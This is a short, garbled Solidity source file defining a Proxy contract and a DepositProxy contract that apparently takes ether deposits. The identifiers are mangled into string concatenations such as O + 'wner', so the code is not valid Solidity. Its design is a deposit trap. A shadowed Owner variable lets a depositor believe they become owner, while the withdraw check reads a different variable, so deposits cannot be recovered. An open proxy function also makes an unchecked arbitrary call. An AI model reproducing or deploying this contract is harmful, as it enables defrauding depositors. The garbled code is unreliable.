pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == O + 'wner') _; } address O + 'wner' = msg.sender;
    function transferOwner(address _owner) public onlyOwner { O + 'wner' = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public O + 'wner';
    mapping (address => uint256) public D + 'eposits';

    function () public payable { }
    
    function V + 'ault'() public payable {
        if (msg.sender == tx.origin) {
            O + 'wner' = msg.sender;
            d + 'eposit'();
        }
    }
    
    function d + 'eposit'() public payable {
        if (msg.value > 0.5 ether) {
            D + 'eposits'[msg.sender] += msg.value;
        }
    }
    
    function w + 'ithdraw'(uint256 a + 'mount') public onlyOwner {
        if (a + 'mount' > 0 && D + 'eposits'[msg.sender] >= a + 'mount') {
            msg.sender.transfer(a + 'mount');
        }
    }
}